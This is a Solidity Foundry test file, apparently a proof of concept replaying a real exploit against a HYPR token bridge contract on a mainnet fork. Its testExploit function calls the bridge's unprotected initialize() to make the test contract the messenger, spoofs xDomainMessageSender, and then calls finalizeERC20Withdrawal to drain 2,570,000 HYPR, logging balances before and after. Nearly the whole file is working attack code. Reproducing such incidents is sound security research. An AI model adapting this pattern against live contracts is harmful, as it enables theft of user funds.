// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

import "@interface/IERC20.sol";
import "@interface/IWETH9.sol";

import "./IL1StandardBridge.sol";

IERC20 constant HYPR = IERC20(0x31aDdA225642a8f4D7e90d4152BE6661ab22a5a2);
IL1StandardBridge constant ChugSplash = IL1StandardBridge(
    payable(0x40C31236B228935b0329eFF066B1AD96e319595e)
);
address constant messageSender = 0x4200000000000000000000000000000000000010;
address constant l2Token = 0xD7a421A6786cF4951a8FaE10385680222D63f89a;

contract ContractTest is Test {
    function setUp() public {
        vm.createSelectFork("mainnet", 18774584);
        vm.label(address(HYPR), "HYPR");
        vm.label(address(ChugSplash), "ChugSplash");
        vm.label(messageSender, "messageSender");
        vm.label(l2Token, "l2Token");
    }

    function print(string memory _txt, uint256 value, uint256 decimal) public {
        emit log_named_decimal_uint(_txt, value, decimal);
    }

    function testExploit() public {
        print(
            "HYPR balance before",
            HYPR.balanceOf(address(this)),
            18
        );

        ChugSplash.initialize(address(this));
        ChugSplash.finalizeERC20Withdrawal(
            address(HYPR),
            l2Token,
            address(ChugSplash),
            address(this),
            2_570_000 ether,
            bytes("")
        );

        print(
            "HYPR balance after",
            HYPR.balanceOf(address(this)),
            18
        );
    }

    function xDomainMessageSender() external pure returns (address) {
        return messageSender;
    }
}
